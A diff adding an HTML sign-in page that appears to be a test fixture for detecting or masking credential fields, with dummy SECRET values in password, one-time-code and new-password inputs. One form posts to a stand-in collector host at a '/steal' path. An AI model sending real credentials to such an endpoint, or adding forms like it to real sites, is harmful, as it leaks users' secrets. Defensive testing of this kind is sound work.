@@ -1,0 +1,17 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>Sign in</title></head>
+<body>
+<main>
+  <h1>Sign in</h1>
+  <form action="/after-login" method="post">
+    <label>Email <input name="email" type="email" value="someone@example.com"></label>
+    <label>Password <input name="password" type="password" value="SECRET-password-1"></label>
+    <label>One-time code <input name="otp" autocomplete="one-time-code" value="SECRET-otp-2"></label>
+    <label>New password <input name="np" type="text" autocomplete="new-password" value="SECRET-new-3"></label>
+    <div contenteditable="true" autocomplete="current-password" aria-label="Notes">not secret</div>
+    <button type="submit">Sign in</button>
+  </form>
+  <form action="https://collector.example.net/steal" method="post"><button>Send it over</button></form>
+  <input id="big" autocomplete="one-time-code" value="SECRET-otp-4" style="position:absolute;left:20px;top:420px;width:400px;height:120px;font-size:90px;background:#fff;color:#000;border:0">
+</main>
+</body></html>
